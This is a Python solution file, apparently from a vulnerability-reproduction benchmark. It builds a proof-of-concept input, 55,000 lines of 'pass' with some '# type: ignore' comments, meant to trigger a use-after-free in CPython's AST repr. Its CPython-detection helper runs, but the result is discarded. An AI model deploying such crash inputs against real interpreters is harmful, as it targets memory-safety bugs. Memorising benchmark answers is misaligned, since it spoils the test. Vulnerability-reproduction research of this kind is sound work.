import os
import tarfile
from typing import Optional


class Solution:
    def _looks_like_cpython(self, src_path: str) -> bool:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if fn in ("Python-ast.c", "_ast.c") or fn.endswith(("Python-ast.c", "_ast.c")):
                        return True
                    if fn.startswith("fuzz") and fn.endswith((".c", ".cc", ".cpp")):
                        return True
            return False

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isfile():
                        continue
                    name = m.name
                    base = os.path.basename(name)
                    if base in ("Python-ast.c", "_ast.c") or base.endswith(("Python-ast.c", "_ast.c")):
                        return True
                    if "python" in name.lower() and ("ast" in name.lower() or "_ast" in name.lower()):
                        return True
                    if ("oss-fuzz" in name.lower() or "ossfuzz" in name.lower()) and (
                        "fuzz" in name.lower() or "fuzzer" in name.lower()
                    ):
                        return True
        except Exception:
            return False
        return False

    def _make_python_ast_repr_uaf_poc(self) -> bytes:
        # Large module body to stress AST repr on sequences, plus some type: ignore lines.
        total_lines = 55000
        ignore_lines = 1024
        if ignore_lines > total_lines:
            ignore_lines = total_lines

        part1 = b"pass  # type: ignore\n" * ignore_lines
        part2 = b"pass\n" * (total_lines - ignore_lines)
        return part1 + part2

    def solve(self, src_path: str) -> bytes:
        # The payload is Python source code bytes.
        # If it isn't CPython, this still returns a broadly-valid input that many AST fuzzers accept.
        _ = self._looks_like_cpython(src_path)
        return self._make_python_ast_repr_uaf_poc()